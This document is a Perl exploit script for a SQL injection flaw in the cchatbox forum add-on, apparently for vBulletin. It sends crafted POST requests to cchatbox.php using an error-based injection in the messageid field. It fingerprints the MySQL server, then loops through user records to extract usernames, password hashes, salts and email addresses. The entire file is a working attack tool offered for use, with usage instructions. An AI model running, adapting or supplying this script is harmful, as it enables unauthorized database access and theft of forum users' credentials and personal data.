use LWP::UserAgent;
$ua = LWP::UserAgent->new;
$ua->agent("MyApp/0.1 ");
print "##################################\n";
print "############ EXPLOIT #############\n";
print "##################################\n";
print "## Portal: cchatbox             ##\n";
print "## Bug: SQLI                    ##\n";
print "## Author: DSecurity            ##\n";
print "## Coder: vv0lll                ##\n";
print "##################################\n";
     
print "Use: exploit.pl address number_user sleeptime\n";
print "Example: exploit.pl http://localhost/vbb 10 10\n";
if(@ARGV < 2) {exit;}
print "\n\n================================================\n";
#Foot print
print v_request(&#039;MySQL version: &#039;,&#039;@@version&#039;);
print v_request(&#039;Data dir: &#039;,&#039;@@datadir&#039;);
print v_request(&#039;User: &#039;,&#039;user()&#039;);
print v_request(&#039;Database: &#039;,&#039;database()&#039;); 
     
#Get user
for($i=1;$i<=$ARGV[1];$i++){
    print "-----------------------------------------\n";
    print $id = v_request(&#039;ID: &#039;,&#039;userid&#039;,&#039;user&#039;,&#039;1&#039;,$i-1);
    if($id =~ /(ID:)\s(.*)/){
        print v_request(&#039;Group: &#039;,&#039;usergroupid&#039;,&#039;user&#039;,&#039;userid=&#039;.$2);
        print v_request(&#039;Username: &#039;,&#039;username&#039;,&#039;user&#039;,&#039;userid=&#039;.$2);
        print v_request(&#039;Password: &#039;,&#039;password&#039;,&#039;user&#039;,&#039;userid=&#039;.$2);
        print v_request(&#039;Salt: &#039;,&#039;salt&#039;,&#039;user&#039;,&#039;userid=&#039;.$2);
        print v_request(&#039;Email: &#039;,&#039;email&#039;,&#039;user&#039;,&#039;userid=&#039;.$2);
    }
             
        }
 
print $ARVG[0];
sub v_request{
    #Declare
    $print = $_[0];
    $select = $_[1];
    $from = $_[2];
    $where = $_[3];
    $limit = $_[4];
    $sleep = $ARGV[2];
    if ($from eq &#039;&#039;) {$from = &#039;information_schema.tables&#039;;}
    if ($where eq &#039;&#039;) {$where = &#039;1&#039;;}
    if ($limit eq &#039;&#039;) {$limit = &#039;0&#039;;}
    if ($sleep eq &#039;&#039;) {$sleep = &#039;10&#039;;}
     
    # Create a request
    my $req = HTTP::Request->new(POST => $ARGV[0].&#039;/cchatbox.php&#039;);
    $req->content_type(&#039;application/x-www-form-urlencoded&#039;);
    $req->content(&#039;do=edit&messageid=0 and (SELECT 1 FROM(SELECT COUNT(*),CONCAT((select &#039;.$select.&#039; from &#039;.$from.&#039; WHERE &#039;.$where.&#039; limit &#039;.$limit.&#039;,1),FLOOR(RAND(1)*3))x FROM information_schema.tables GROUP BY x)a)&#039;);
 
    # Pass request to the user agent and get a response back
    my $res = $ua->request($req);
    #print $res->content;
    if($res->content =~ /(MySQL Error)(.*?)&#039;(.*?)0&#039;(.*)/)
    {$test = $3};
    sleep($sleep);
    return $print.$test."\n";
}



